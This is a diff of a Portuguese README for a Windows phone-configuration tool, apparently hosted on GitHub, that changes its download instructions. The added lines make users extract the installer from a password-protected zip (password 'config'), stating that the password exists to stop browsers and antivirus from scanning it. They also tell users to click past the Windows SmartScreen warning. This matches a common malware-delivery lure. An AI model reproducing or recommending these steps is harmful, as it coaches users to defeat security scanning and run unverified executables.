@@ -23,13 +23,17 @@
 
 **[» Baixar (ConfigCelular-Setup.zip) «](https://github.com/satoshigynn/config-celular/releases/latest/download/ConfigCelular-Setup.zip)**
 
-Depois de baixar: **extraia o .zip** e execute o **ConfigCelular-Setup.exe** de dentro dele.
+Depois de baixar:
+1. **Extraia o .zip** — quando pedir **senha, digite:** `config`
+2. Execute o **ConfigCelular-Setup.exe** que está dentro.
+
+> 🔒 **Por que o .zip tem senha?** A senha (`config`) impede que o navegador/antivírus "escaneiem" o instalador e mostrem um **falso alerta de vírus** no download. **Não há vírus** — é só o instalador do programa.
 
 Ou veja todas as versões na página de **[Releases](https://github.com/satoshigynn/config-celular/releases)**.
 
 > É um instalador único e autossuficiente: já vem com o **ADB** e o **Node** embutidos. Não precisa instalar mais nada.
 >
-> **Sobre avisos do Windows:** o programa **não tem vírus** — como ele ainda não é assinado digitalmente, o Windows pode mostrar *"O Windows protegeu o seu PC"*. É só clicar em **"Mais informações" → "Executar assim mesmo"**.
+> **Aviso do Windows ao abrir:** se aparecer *"O Windows protegeu o seu PC"*, clique em **"Mais informações" → "Executar assim mesmo"** (o programa não é assinado, mas não tem vírus).
 
 ---
 
